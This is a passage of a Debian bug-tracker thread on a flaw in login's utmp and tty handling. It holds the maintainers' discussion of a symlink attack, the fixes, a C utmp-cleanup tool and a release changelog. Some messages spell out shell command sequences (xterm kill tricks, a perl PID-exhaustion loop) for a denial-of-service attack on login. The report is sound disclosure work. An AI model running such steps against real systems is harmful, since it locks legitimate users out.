Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 10 Nov 2008 23:54:07 GMT) ([full text](bugreport.cgi?bug=505071;msg=47), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=47), [link](#46)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 10 Nov 2008 23:54:07 GMT) ([full text](bugreport.cgi?bug=505071;msg=49), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=49), [link](#48)).

---

[Message #50](#50) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=50), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=50), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty
mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 00:52:57 +0100
```
On Tue, Nov 11, 2008 at 07:36:18AM +1100, psz@maths.usyd.edu.au wrote:
>
> Curious way of counting bugs. What do you mean exploitable: to do what?
> (Surely is_my_tty cannot protect, being buggy itself.)
>
> As I see things, the following bugs are present:
>
> - bad selection of utmp entry [often choosing wrong]

Often is arguable.
2 reports in 10 years.

> - is_my_tty uses stat [should be lstat]

I'm not sure lstat is right.
If the caller of login puts the name of a symbolic link for any reason in
utmp, I don't think that should be a failure.

> - is_my_tty compares rdev only [should also test dev ino etc]

I don't think the device or the inode is relevant.
If the major and minor of the device are identical, then they indicate the
same device.

> - maybe is_my_tty should scrutinize path [ensure directory components
>   are root-owned and safe]

Same as lstat, I don't think the paths have to match.

> - race between is_my_tty checks and chown

Yes.

> - chown of unsafe path [should be fchown anyway]

Except for the race, I don't think the path in unsafe.

> As things are, it is exploitable to elevate privileges from group utmp
> to root. It is also buggy, often failing for legitimate use. Fixing all
> bugs would be best; fixing some may already render it "safe" against
> exploitation, and/or restore functionality.

I currently think is_my_tty should be removed. checkutmp should check that
ut_line matches with the current tty, and return a file descriptor

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Tue, 11 Nov 2008 00:51:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=52), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=52), [link](#51)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 11 Nov 2008 00:51:07 GMT) ([full text](bugreport.cgi?bug=505071;msg=54), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=54), [link](#53)).

---

[Message #55](#55) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=55), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=55), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: Bug#505071: login tty mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 11:47:53 +1100
```
Dear Nekral,

> Often is arguable.

Are not computers meant to be infallible and perfect?

---

Privileged programs should be strict on what they accept.

Paths are un-safe unless you verify that all directories above are
root-owned and not group or world writeable.

---

How you count bugs, how you fix the issues, is up to you (does not have
to be to my liking). Please fix soon, before someone writes an exploit.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Tue, 11 Nov 2008 11:04:37 GMT) ([full text](bugreport.cgi?bug=505071;msg=57), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=57), [link](#56)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 11 Nov 2008 11:04:38 GMT) ([full text](bugreport.cgi?bug=505071;msg=59), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=59), [link](#58)).

---

[Message #60](#60) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=60), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=60), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: login tty mis-determination
(see bug#332198)
Date: Tue, 11 Nov 2008 12:00:28 +0100
```
clone 505071 -1
retitle -1 symlink attack in login leading to arbitrary file ownership
tags -1 security
severity -1 serious
tags -1 patch
thanks

Somebody with write access to the utmp database can create the conditions
for a symlink attack in login, leading to gaining ownership of an
arbitrary file.

Proposed fix: Changing chown (tty, ...) to fchown (0, ...) in chowntty()

Best Regards,
--
Nekral

```

---

**Bug [505071](bugreport.cgi?bug=505071) cloned as bug [505271](bugreport.cgi?bug=505271).**
Request was from `Nicolas François <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Tue, 11 Nov 2008 11:04:39 GMT) ([full text](bugreport.cgi?bug=505071;msg=62), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=62), [link](#61)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Tue, 11 Nov 2008 12:15:07 GMT) ([full text](bugreport.cgi?bug=505071;msg=64), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=64), [link](#63)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 11 Nov 2008 12:15:08 GMT) ([full text](bugreport.cgi?bug=505071;msg=66), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=66), [link](#65)).

---

[Message #67](#67) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=67), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=67), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org, 505271@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: login tty mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 23:13:21 +1100
```
Dear Nekral,

> Proposed fix: Changing chown (tty, ...) to fchown (0, ...) in chowntty()

Surely you meant to change chmod to fchmod also. (I know this is
nit-picking, but best to be sure...)

Thanks, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 23 Nov 2008 05:57:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=69), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=69), [link](#68)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 23 Nov 2008 05:57:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=71), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=71), [link](#70)).

---

[Message #72](#72) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=72), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=72), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, 505271@bugs.debian.org,
nicolas.francois@centraliens.net
Subject: Bug#505071 and Bug#505271 comments
Date: Sun, 23 Nov 2008 16:56:17 +1100
```
Random comments about bugs 505071 and 505271.

Group utmp was introduced so terminal emulators could be setgid instead
of needing setuid root, to prevent bugs in them to escalate to root
access. Terminal emulators are generally not written with security in
mind, being the "more features the better" type of programs. This bug
negates the benefit of the group utmp separation. Any data controllable
by group utmp should be treated as insecure or possibly hostile.

Seems that login attempts to pick the "right" line of the utmp file.
Funny idea, seeing how pututline will whack the entry "anywhere"
(depending on ut_id which are rather arbitrary and irrelevant).

If login wanted to sanitize left-over utmp entries, then should set what
ttyname thinks is the correct ut_line (and what it thinks is a sensible
ut_id), not perpetuate "wrong" settings.

Privileged programs should not attempt to clean up utmp, root can do
that at his leisure e.g. with "echo -n '' > /var/run/utmp".

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Fri, 23 Jan 2009 02:12:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=74), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=74), [link](#73)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 23 Jan 2009 02:12:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=76), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=76), [link](#75)).

---

[Message #77](#77) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=77), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=77), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Fri, 23 Jan 2009 13:10:24 +1100
```
We had discussed whether login fails often due to left-over utmp
entries. I guess that depends on how likely it is that processes die
without cleanup; and how important it is that login should "work".

I now see that there is the possibility for a DoS attack, by filling
up utmp with left-over entries to cover all PIDs (or a significant
proportion of PID space). For example, we can cause one left-over
entry with

  run xterm and within that xterm use "kill -9 $PPID"

and might try that repeatedly to exhaust PID space; except xterm
reuses ptys and re-writes utmp entries, and the pty space is smaller
than PID space...

Until this is fixed, utmp should be sanitized regularly to remove
unused entries. I now use the following, often (i.e. nightly).

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

---

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <utmp.h>
#include <time.h>
/*
#include <signal.h>
#include <errno.h>
*/

int main( int argc, char *argv[])
{
char *usage = "Usage:\n\n\
  clear-dead-utmp-entries [-quiet] [-really]\n\n\
to clear left-over utmp entries.\n\n";

int debug = 0;
int quiet = 0;
int really = 0;
int cleared = 0;
int clearable = 0;
int header = 0;
int i;
struct utmp *utmpp;
struct tm *tmmp;
#define buflen 256
char buf[buflen];
struct stat strst;

for (i=1; i<argc; i++) {
  if (!strcmp(argv[i], "-debug")) {
    debug++;
  }
  else if (!strcmp(argv[i], "-quiet")) {
    quiet++;
  }
  else if (!strcmp(argv[i], "-really")) {
    really++;
  }
  else {
    printf ("\nBad option %s. %s", argv[i], usage);
    return 1;
  }
}

setutent();

while (utmpp = getutent()) {
  if (utmpp->ut_type != INIT_PROCESS &&
      utmpp->ut_type != LOGIN_PROCESS &&
      utmpp->ut_type != USER_PROCESS) continue;
  if (utmpp->ut_pid == 0) continue;

  /* Is this PID "alive"? */
  /* Seems that /usr/bin/who uses
  if (kill(utmpp->ut_pid, 0) < 0 && errno == ESRCH) continue;
     but "plain" psz gets EPERM, while root gets success with ENOENT.
  */
  sprintf(buf, "/proc/%d", (int)utmpp->ut_pid);
  if (!stat(buf, &strst)) continue;

  tmmp = localtime(&utmpp->ut_time);
  strftime(buf, buflen, "%b %d %H:%M", tmmp);
  if (debug) {
    printf ("\nutmp line:\n");
    printf ("  ut_user: %.*s\n", sizeof(utmpp->ut_user), utmpp->ut_user);
    printf ("  ut_id:   %.*s\n", sizeof(utmpp->ut_id), utmpp->ut_id);
    printf ("  ut_line: %.*s\n", sizeof(utmpp->ut_line), utmpp->ut_line);
    printf ("  ut_type: %d\n", (int)utmpp->ut_type);
    printf ("  ut_pid:  %d\n", (int)utmpp->ut_pid);
    printf ("  e_term:  %d\n", (int)utmpp->ut_exit.e_termination);
    printf ("  e_exit:  %d\n", (int)utmpp->ut_exit.e_exit);
    printf ("  ut_time: %s\n", buf);
    printf ("  ut_host: %.*s\n", sizeof(utmpp->ut_host), utmpp->ut_host);
    printf ("\n");
  }

  if (!header) {
    printf ("T PID   Name      Line    Time         Hostname\n");
    header++;
  }
  printf ("%-2d%-6d%-10.10s%-8.8s%-13.13s%.40s\n",
    (int)utmpp->ut_type,
    (int)utmpp->ut_pid,
    utmpp->ut_user,
    utmpp->ut_line,
    buf,
    utmpp->ut_host);

  if (!really) {
    clearable++;
    continue;
  }

  utmpp->ut_type = DEAD_PROCESS;
  if (! pututline(utmpp)) {
    printf ("\nERROR: Cannot clear utmp entry above\n\n");
    break;
  };
  cleared++;
}

if (cleared==1) {
  printf ("Cleared one utmp entry shown above\n");
}
else if (cleared>1) {
  printf ("Cleared %d utmp entries shown above\n", cleared);
}
else {
  if (clearable) printf ("No utmp entries cleared, need '-really' option for that\n");
  else if (!quiet) printf ("No utmp entries cleared\n");
}

}

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Fri, 23 Jan 2009 03:03:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=79), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=79), [link](#78)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 23 Jan 2009 03:03:07 GMT) ([full text](bugreport.cgi?bug=505071;msg=81), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=81), [link](#80)).

---

[Message #82](#82) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=82), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=82), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Fri, 23 Jan 2009 13:58:26 +1100
```
Hmm... could we use Samba for a DoS against login? On a PC log in to
Samba, then "kill -9 PID-of-my-smbd" to leave one utmp entry behind.
Samba will automatically re-spawn a new smbd, then kill that... I do
not yet know how large is the ut_id space used by samba (whether this
could exhaust a significant proportion of PID space).

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Fri, 23 Jan 2009 21:27:04 GMT) ([full text](bugreport.cgi?bug=505071;msg=84), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=84), [link](#83)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 23 Jan 2009 21:27:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=86), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=86), [link](#85)).

---

[Message #87](#87) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=87), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=87), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Sat, 24 Jan 2009 08:09:41 +1100
```
I wrote:

> ... we can cause one left-over entry with [xterm] ... except xterm
> reuses ptys and re-writes utmp entries ...

We can arrange to hog the pty but release the PID with

  run xterm, and within that xterm use
  bash -c 'trap "" 11; sleep 600 &'; kill -11 $PPID

Then waste a few PIDs with something like
  perl -e 'foreach (1..32000) { system "/bin/false" }'
so the "next PID" will be what we want; then do the xterm again and
repeat until we have a contiguous block of PIDs in the utmp file.
Spin the "next PID" to be within that range, and we have a DoS
against the next few login attempts.

I do not know what practical uses this could have: lock out root so
cannot observe our activities?

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Thu, 29 Jan 2009 19:21:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=89), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=89), [link](#88)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 29 Jan 2009 19:21:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=91), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=91), [link](#90)).

---

[Message #92](#92) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=92), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=92), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Fri, 30 Jan 2009 06:17:39 +1100
```
Another (unrelated?) query. Login re-writes, or writes, a utmp entry.
Should not it remove that entry on exit? I do not think telnetd does
anything with utmp.

Thanks,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Tags added: pending**
Request was from `Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Sun, 05 Apr 2009 23:03:12 GMT) ([full text](bugreport.cgi?bug=505071;msg=94), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=94), [link](#93)).

---

**Reply sent**
to `Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>`:

You have taken responsibility.
(Tue, 14 Apr 2009 22:48:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=96), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=96), [link](#95)).

---

**Notification sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Bug acknowledged by developer.
(Tue, 14 Apr 2009 22:48:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=98), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=98), [link](#97)).

---

[Message #99](#99) received at 505071-close@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=99), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=99), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
To: 505071-close@bugs.debian.org
Subject: Bug#505071: fixed in shadow 1:4.1.3-1
Date: Tue, 14 Apr 2009 22:47:12 +0000
```
Source: shadow
Source-Version: 1:4.1.3-1

We believe that the bug you reported is fixed in the latest version of
shadow, which is due to be installed in the Debian FTP archive:

login_4.1.3-1_i386.deb
  to pool/main/s/shadow/login_4.1.3-1_i386.deb
passwd_4.1.3-1_i386.deb
  to pool/main/s/shadow/passwd_4.1.3-1_i386.deb
shadow_4.1.3-1.diff.gz
  to pool/main/s/shadow/shadow_4.1.3-1.diff.gz
shadow_4.1.3-1.dsc
  to pool/main/s/shadow/shadow_4.1.3-1.dsc
shadow_4.1.3.orig.tar.gz
  to pool/main/s/shadow/shadow_4.1.3.orig.tar.gz

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 505071@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net> (supplier of updated shadow package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Format: 1.8
Date: Tue, 14 Apr 2009 23:33:22 +0200
Source: shadow
Binary: passwd login
Architecture: source i386
Version: 1:4.1.3-1
Distribution: unstable
Urgency: low
Maintainer: Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>
Changed-By: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
Description:
 login      - system login tools
 passwd     - change and administer password and group data
Closes: [474318](bugreport.cgi?bug=474318) [487105](bugreport.cgi?bug=487105) [498788](bugreport.cgi?bug=498788) [499578](bugreport.cgi?bug=499578) [505071](bugreport.cgi?bug=505071) [508785](bugreport.cgi?bug=508785) [511739](bugreport.cgi?bug=511739) [511961](bugreport.cgi?bug=511961) [513252](bugreport.cgi?bug=513252) [517809](bugreport.cgi?bug=517809) [523621](bugreport.cgi?bug=523621) [523798](bugreport.cgi?bug=523798)
Changes:
 shadow (1:4.1.3-1) unstable; urgency=low
 .
   * The "" release.
   * New upstream release:
     - Fix possible login DOS. Closes: #[505071](bugreport.cgi?bug=505071)
     - Fix gpasswd and username with 32 characters. Closes: #[508785](bugreport.cgi?bug=508785)
     - Fix typo in nologin(8). Closes: #[513252](bugreport.cgi?bug=513252)
     - Remove old features from passwd(1). Closes: #[499578](bugreport.cgi?bug=499578)
     - login: Close passwd while waiting for exit. Closes: #[474318](bugreport.cgi?bug=474318)
     - login: fix the count of login failures. Closes: #[498788](bugreport.cgi?bug=498788)
     - Remove patches applied upstream (4.1.2):
       + debian/patches/434_login_stop_checking_args_after--
       + debian/patches/491_configure.in_friendly_selinux_detection
       + debian/patches/487_passwd_chauthtok_failed_message
       + debian/patches/406_vipw_resume_properly
       + debian/patches/414_remove-unwise-advices
       + debian/patches/300_SHA_crypt_method
       + debian/patches/301_manpages_missing_options
       + debian/patches/415_login_put-echoctl-back
       + debian/patches/431_su_uid_0_not_root
     - Remove patches applied upstream (4.1.3):
       + debian/patches/200_Czech_binary_translation
       + debian/patches/302_remove_non_translated_polish_manpages
       + debian/patches/494_passwd_lock-no_account_lock
       + debian/patches/200_Czech_binary_translation
       + debian/patches/494_passwd_lock-no_account_lock
     - Updated patches:
       + debian/patches/431_su_uid_0_not_root
       + debian/patches/463_login_delay_obeys_to_PAM
       + debian/patches/008_su_get_PAM_username
       + debian/patches/302_vim_selinux_support
       + debian/patches/008_login_log_failure_in_FTMP
       + debian/patches/429_login_FAILLOG_ENAB
       + debian/patches/428_grpck_add_prune_option
       + debian/patches/401_cppw_src.dpatch
       + debian/patches/506_relaxed_usernames
       + debian/patches/463_login_delay_obeys_to_PAM
       + debian/patches/542_useradd-O_option
     - Translations
       + New Kazakh translation. Closes: #[517809](bugreport.cgi?bug=517809)
       + Updated Slovak translation. Closes: #[523621](bugreport.cgi?bug=523621)
   * debian/patches/454_userdel_no_MAIL_FILE: Patch removed. If MAIL_FILE is
     defined, the mailbox is not in MAIL_SPOOL_DIR.
   * debian/patches/506_relaxed_usernames: Use an extra paragraph for the note
     on username with a '/'.
   * debian/patches/504_undef_USE_PAM.nolibpam,
     debian/patches/504_undef_USE_PAM.dpatch, debian/rules: Patches removed.
     Replaced by the --disable-account-tools-setuid configure option.
   * debian/control: changed the "Replaces" on manpages-zh to a versioned
     one on 1.5.1-1
   * debian/control: drop all Replaces on manpages-* when the version is
     prior to Etch
   * Versioned Replaces on manpages-tr (<<1..5) as conflicting manpages have
     been removed in that package
   * debian/patches/402_cppw_selinux: Add SE Linux support for cppw / cpgr.
   * debian/patches/900_testsuite_groupmems, debian/patches/901_testsuite_gcov:
     Added patches, only intended to be used in the testsuite.
   * debian/securetty.linux: Added ttyPZ0, ttyPZ1, ttyPZ2, ttyPZ3 for PowerMac
     machines.  Closes: #[511739](bugreport.cgi?bug=511739)
   * debian/patches/579_chowntty_debug: Removed. With the fix for 505071 and
     505271, this additional debug information is no more needed.
   * debian/patches/507_32char_grnames.dpatch: Patch removed. Replaced by the
     --with-group-name-max-length=32 configure option.
   * debian/patches/592_manpages_typos: No more needed.
   * debian/patches/401_cppw_src.dpatch: Call fsync before closing the backup
     file descriptor. This ensures that the backup file will be available on
     the storage medium.
   * debian/securetty.linux: Removed devfs devices. Usage of devfs enabled
     kernel in Lenny was not supported. Closes: #[511961](bugreport.cgi?bug=511961)
   * debian/login.defs: Added /usr/local/games/ to ENV_PATH (for regular
     users). Closes: #[487105](bugreport.cgi?bug=487105)
   * debian/patches/200_bin_nb: Updated Norwegian Bokmål translation.
     Closes: #[523798](bugreport.cgi?bug=523798)
   * debian/login.defs: Update GID_MIN to 1000. This is more consistent with
     UID_MIN, SYS_GID_MAX and the usage of the same ID for UID and GIDs. This
     should also be more consistent with the assignment of system group IDs
     starting from GID_MAX and going down.
Checksums-Sha1:
 33524f2d5fe86dcbeb0ae0c1b2e650c976c66909 1545 shadow_4.1.3-1.dsc
 36461090d62c5e262fe9306490d815025604aa80 2669037 shadow_4.1.3.orig.tar.gz
 822dabee0160bf1479bf6e49625f799ab3cc8931 126656 shadow_4.1.3-1.diff.gz
 d1db90de0dbef2d3ba2947f628ae17cd0f976450 929314 passwd_4.1.3-1_i386.deb
 402ae8d5e2d1a183cbf7fa91930185e92592ccb0 673684 login_4.1.3-1_i386.deb
Checksums-Sha256:
 d5e6e7a382a233d4c7833d4e2b251238f2de1b7550aab3178c01b874dda71ebd 1545 shadow_4.1.3-1.dsc
 fef065c4317631068e55b04460eea058afe8e0d155372562672a22a013addd7a 2669037 shadow_4.1.3.orig.tar.gz
 67c9fc554708b0d8d377965ef3feb300e2ef61aecfe11dee23124226651dab38 126656 shadow_4.1.3-1.diff.gz
 955666a44752a2c4aebef12404b74fe4717daed8049f551ef1b06f53530b8cc5 929314 passwd_4.1.3-1_i386.deb
 6b8e3e33952a630fa2a73bde93cd5cd52de1f630a760cd9887f56f9ae27db5ea 673684 login_4.1.3-1_i386.deb
Files:
 e0a639aa479ef186a31d4d39fc67dada 1545 admin required shadow_4.1.3-1.dsc
 d77a393dfd48746e7d63d38f6d5a1053 2669037 admin required shadow_4.1.3.orig.tar.gz
 ebe323127df8307060bee7916c30ea0b 126656 admin required shadow_4.1.3-1.diff.gz
 836ea47407e376ef22094d96c6cdc14e 929314 admin required passwd_4.1.3-1_i386.deb
 687bcf4bc7d540e2865386c9e85072f7 673684 admin required login_4.1.3-1_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (GNU/Linux)

iEYEARECAAYFAknlDuUACgkQWgo5mup89a0VHQCdFFSk1PoFMU6SiBIZoRSiCK9b
zmgAn1dw0ANOFPuhz6nJl8oE7ve0yr2K
=xBHh
-----END PGP SIGNATURE-----

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Thu, 16 Apr 2009 10:03:03 GMT) ([full text](bugreport.cgi?bug=505071;msg=101), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=101), [link](#100)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 16 Apr 2009 10:03:03 GMT) ([full text](bugreport.cgi?bug=505071;msg=103), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=103), [link](#102)).

---

[Message #104](#104) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=104), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=104), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org
Cc: team@security.debian.org
Subject: Re: Bug#505071 closed ... fixed in shadow 1:4.1.3-1
Date: Thu, 16 Apr 2009 19:59:17 +1000
```
Dear Nicolas,

> We believe that the bug you reported is fixed in ...
